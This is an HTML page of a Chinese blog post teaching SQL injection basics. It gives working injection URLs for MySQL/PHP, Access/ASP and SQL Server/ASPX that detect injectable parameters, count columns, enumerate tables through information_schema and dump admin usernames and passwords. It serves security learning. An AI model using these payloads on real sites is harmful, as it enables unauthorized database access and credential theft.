@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzer0kx.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="漏洞描述攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系 统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后 台数据库乃至整个应用系统的入侵。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入基础入门">
+<meta property="og:url" content="http://lzer0kx.top/2022/10/06/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="Lzer0Kx的信安之路">
+<meta property="og:description" content="漏洞描述攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系 统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后 台数据库乃至整个应用系统的入侵。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-10-06T10:31:19.000Z">
+<meta property="article:modified_time" content="2022-10-06T10:33:58.197Z">
+<meta property="article:author" content="Lzer0Kx">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://lzer0kx.top/2022/10/06/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql注入基础入门 | Lzer0Kx的信安之路</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lzer0Kx的信安之路</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzer0kx.top/2022/10/06/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lzer0Kx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzer0Kx的信安之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入基础入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-06 18:31:19 / 修改时间：18:33:58" itemprop="dateCreated datePublished" datetime="2022-10-06T18:31:19+08:00">2022-10-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的数据中包含对某些数据库系 统有特殊意义的符号或命令，让攻击者有机会直接对后台数据库系统下达指令，进而实现对后 台数据库乃至整个应用系统的入侵。</p>
+<span id="more"></span>
+
+<p>sql注入原理</p>
+<p>服务器没有过滤用户输入的恶意数据，直接把用户输入的数据当作sql语句执行，从而影响数据库安全和平台安全。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>用户能够控制输入</p>
+<p>原本程序要执行的sql语句，拼接了用户输入的恶意数据</p>
+<p>当然 sql注入因为要把恶意sql语句注入到数据库中 所以我们需要针对不同的数据库进行不同的注入 而且通常不同的数据库和不同的编程语言结合起来 比如常见的mysql+php 下面我们就把常见的注入总结一下</p>
+<h3 id="mysql-php"><a href="#mysql-php" class="headerlink" title="mysql+php"></a>mysql+php</h3><p>这种组合是目前我们比较常见的一种 我们mysql基础入手来介绍一下</p>
+<p>mysql数据库的语句一般是</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ... from ... where id=&#x27;$id&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>我们在注入时需要通过尝试 特别是在黑盒的情况下判断 id&#x3D;’$id’ 这里的情况 以?id&#x3D;…..这样的形式将构造出来的恶意sql语句插入到数据库中 达到控制数据库的目的</p>
+<p>我们举个栗子</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=1</span><br></pre></td></tr></table></figure>
+
+<p>它的实际查询代码原型就是上面的sql语句 这个时候我们怎样去判断是否存在注入</p>
+<p>首先判断注入点是否为字符型 也就是是否有引号(可能是单引号也可能是双引号)</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;     页面返回错误</span><br><span class="line">id=1&#x27; and &#x27;1&#x27;=&#x27;1  运行正常</span><br><span class="line">id=1&#x27; and &#x27;1&#x27;=&#x27;2  运行异常</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下我们基本就能判断存在sql注入 因为我们的sql语句构造的判断条件已经通过页面返回结果</p>
+<p>当然还存在没有字符的情况 这种就是数字型</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ... from ... where id=$id ...</span><br><span class="line">http://www.testweb.com/user.php?id=8</span><br></pre></td></tr></table></figure>
+
+<p>判断</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id = 8&#x27; 返回错误</span><br><span class="line">id = 8 and 1=1 运行正常</span><br><span class="line">id = 8 and 1=2 运行异常</span><br></pre></td></tr></table></figure>
+
+<p>确定注入之后就可以通过手工注入去判断列数等等</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=1 order by 3</span><br></pre></td></tr></table></figure>
+
+<p>order判断列数</p>
+<p>order by 3 页面正常 order by 4 页面返回空白 或者文章没有显示出来，列数为3个</p>
+<p>mysql与access数据库不一样。在没有表名的前提下也可以查询数据库一些信息，如安装路径、库名、操作系统信息，下面列举一些</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_user() 系统用户名</span><br><span class="line">user() 用户名</span><br><span class="line">current_user 当前用户名</span><br><span class="line">session_user()连接数据库的用户名</span><br><span class="line">database() 数据库名</span><br><span class="line">version() MYSQL数据库版本</span><br><span class="line">load_file() MYSQL读取本地文件的函数</span><br><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 安装路径</span><br><span class="line">@@version_compile_os 操作系统 </span><br></pre></td></tr></table></figure>
+
+<p>判断完列数之后 就可以联合查询进行注入</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=-1 union select 1,2,3</span><br><span class="line">http://www.textweb.com/test.php?id=1 and 1=2 union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>通过页面回显数字点 这里为什么有?id&#x3D;-1以及?id&#x3D;1 and 1&#x3D;2，因为我们要控制前面获取数据为null ，将会显示后面的数字</p>
+<p>查询库名</p>
+<p>同样也可以查询数据库其他信息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=-1 union select 1,2,database()</span><br></pre></td></tr></table></figure>
+
+<p>查询表名</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=-1 union select 1,2,table_name from information_schema.tables where table_schema=表名 limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>mysql 里面有一个库information_schema 里面存在很多信息，其中包括所有的库名， 表名， 字段名。因为可以利用这个库来获取当前库的表 后面limit 0,1 就是获取第一个表名，获取第二个表名，就要把0 改变成 1，第三个，2， 第四 ，3， 如此类推直接返回空</p>
+<p>这里呢还可以把表名转换成十六进制</p>
+<p>查询字段</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=-1 union select 1,2,column_name from information_schema.columns where table_name=表名 limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>查询数据</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.textweb.com/test.php?id=-1 union select 1,2,group_concat(username,0x3a,password) from admin</span><br></pre></td></tr></table></figure>
+
+<p>group_concat() 用于 打印并接 字符串 输出两个字段的内容 0x3a是 字符占位</p>
+<p>这样我们就进行了一次对mysql+php结构的注入 得到admin的username和password 参考实战可以看我的sqllabs笔记</p>
+<p>当然，sql注入的玩法也有很多种，如果页面没有回显怎么办?这个时候我们就要考虑报错注入和盲注。如果开发者利用防护手段将 ‘转义为’\怎么办?这个时候我们要考虑宽字节注入和二次注入等等</p>
+<h3 id="access-asp"><a href="#access-asp" class="headerlink" title="access + asp"></a>access + asp</h3><p>access也是一种关系型数据库，它有很多地方和mysql相似，但还是有些地方不同</p>
+<p>assess数据库结构</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">access</span><br><span class="line">   表名</span><br><span class="line">      列名</span><br><span class="line">         数据</span><br></pre></td></tr></table></figure>
+
+<p>mysql</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">   数据库名</span><br><span class="line">      表名</span><br><span class="line">         列名</span><br><span class="line">            数据</span><br></pre></td></tr></table></figure>
+
+<p>我们看到access比起mysql在结构上缺少了数据库名</p>
+<p>判断是否存在注入</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and方法</span><br><span class="line">http://127.0.0.1:99/ProductShow.asp?ID=104 and 1=1 正确页面</span><br><span class="line">http://127.0.0.1:99/ProductShow.asp?ID=104 and 1=2 错误页面or 判断</span><br><span class="line">or方法判断</span><br><span class="line">http://127.0.0.1:99/ProductShow.asp?ID=-104 or 1=2 错误页面</span><br><span class="line">http://127.0.0.1:99/ProductShow.asp?ID=104 or 1=1 正常页面</span><br></pre></td></tr></table></figure>
+
+<p>判断字段数</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by 判断当前表的字段数</span><br><span class="line">http://127.0.0.1:99/shownews.asp?id=110 order by 10 正常</span><br><span class="line">http://127.0.0.1:99/shownews.asp?id=110 order by 11 错误</span><br></pre></td></tr></table></figure>
+
+<p>猜表 这块其实可以用到sqlmap去猜</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:99/shownews.asp?id=110 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br><span class="line"></span><br><span class="line">将 admin 换成别的表</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlserver-asp-x2F-aspx"><a href="#sqlserver-asp-x2F-aspx" class="headerlink" title="sqlserver + asp&#x2F;aspx"></a>sqlserver + asp&#x2F;aspx</h3><p>sqlserver经常配合与asp或者aspx一起使用，操作系统多是win2012，win2018</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=1</span><br></pre></td></tr></table></figure>
+
+<p>判断是否存在注入以及判断列数与mysql类似，就不多说了</p>
+<p>但是在联合查询的时候 ，可以使用null直到页面出错</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27;</span><br><span class="line">http://www.demo1.com/index.aspx?id=-1 union select null,null,null</span><br></pre></td></tr></table></figure>
+
+<p>显示系统信息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=1 and @@version&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>爆数据库</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=-1 and db_name()&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>当前用户dbo</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=-1 and User_Name()&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>快速爆表，爆列，爆数据</p>
+<p>其实这里可以利用的是 sql server数据库的一个特性 视图→系统视图</p>
+<p>在这个下面有很多关于这个库的表，表里面存放了很多关于这个库的信息</p>
+<p>利用</p>
+<p>1.查询当前用户</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=-1 and User_Name()&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>2.根据当前用户爆出所有表</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=1 and(select table_name from information_schema.tables where table_schema=&#x27;dbo&#x27; FOR XML PATH)&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>3.爆列</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=1 and(select column_name from information_schema.columns where table_name=&#x27;admin&#x27; FOR XML PATH)&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>4.爆数据</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.demo1.com/index.aspx?id=1 and (select username,password from admin FOR XML PATH)&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>大概就先总结上面几种注入的基础思路，在实战环境中，我们在进行sql注入时需要面临各种各样的防护，包括一些知名waf(阿里云，安全狗，D盾等等)的拦截，以及开发者对于一些关键参数的过滤等等，所以就需要我们在掌握初步的sql注入方法之后，在基础的前提下，还要继续去钻研更新，更奇妙的方法，不能只依赖sqlmap之类的扫描工具。对于各种数据库更应该了然于胸，这样才能走的更远，飞的更高。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/27/sqllabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" rel="prev" title="sqllabs靶场记录">
+      <i class="fa fa-chevron-left"></i> sqllabs靶场记录
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-php"><span class="nav-number">3.</span> <span class="nav-text">mysql+php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#access-asp"><span class="nav-number">4.</span> <span class="nav-text">access + asp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlserver-asp-x2F-aspx"><span class="nav-number">5.</span> <span class="nav-text">sqlserver + asp&#x2F;aspx</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lzer0Kx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lzer0Kx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaobaiakai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaobaiakai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lzer0Kx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
